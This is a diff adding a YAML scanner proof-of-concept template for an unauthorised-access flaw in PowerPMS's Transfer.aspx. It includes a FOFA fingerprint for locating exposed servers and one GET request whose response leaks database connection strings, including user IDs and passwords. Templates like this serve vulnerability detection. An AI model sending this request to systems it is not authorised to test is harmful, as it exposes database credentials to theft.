@@ -1,0 +1,28 @@
+id: poc-yaml-powerpms-transfer-aspx-unauthorized-access
+info:
+  name: 普华 PowerPMS Transfer.aspx 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: powerpms
+  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+requests:
+- method: GET
+  path: /PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"DataBaseCode\"") &&
+
+    contains(body,"\"DataBaseName\":") &&
+
+    contains(body,"\"ServerName\":\"") &&
+
+    contains(body,"User ID=") &&
+
+    contains(body,"Password=") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
